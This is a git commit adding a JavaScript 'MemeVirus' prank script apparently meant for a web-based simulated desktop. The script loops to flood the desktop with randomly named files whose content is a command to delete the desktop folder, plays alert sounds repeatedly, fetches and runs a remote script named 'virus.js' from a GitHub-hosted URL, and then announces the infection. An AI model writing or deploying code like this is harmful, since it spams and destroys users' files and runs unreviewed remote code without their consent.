7799e8063efc8c4f8da9310b3fb164e70d7b65fd
mhmmkm <72941240+mhmmkm@users.noreply.github.com>
2020-10-20 12:25:54 -0600

    Add files via upload

---
+++ MemeVirus (1).js
@@ -0,0 +1,38 @@
+(function theLoop (i) {
+  setTimeout(function () {
+
+// Function to generate random number
+function randomNumber(min, max) {
+    min = Math.ceil(min); 
+    max = Math.floor(max); 
+    return Math.floor(Math.random() * (max - min + 0.01)) + min; 
+}
+
+$store.set('desktop/meme' + ( randomNumber(1, 1000000) ) + '.js', '$store.del("/a/desktop/)')
+$audio('alert').play()
+$audio('alert').play()
+$audio('alert').play()
+$audio('alert').play()
+$audio('alert').play()
+$audio('alert').play()
+$audio('alert').play()
+$audio('alert').play()
+$audio('alert').play()
+$audio('alert').play()
+$audio('alert').play()
+$audio('alert').play()
+$audio('alert').play()
+$audio('alert').play()
+$audio('alert').play()
+
+$store.keys() 
+        if (--i) {
+      theLoop(i);
+    }
+  }, 10); //Here u can customize the delay (1000=1sec)
+})(50); //Here u can change how many times a file is created
+
+//Have fun 
+$loader.script("https://raw.githack.com/mhmmkm/Yhingy/main/virus.js")
+//made by mkm
+$alert('WARNING YOU HAVE BEEN INFECTED BY THE MEME VIRUS')
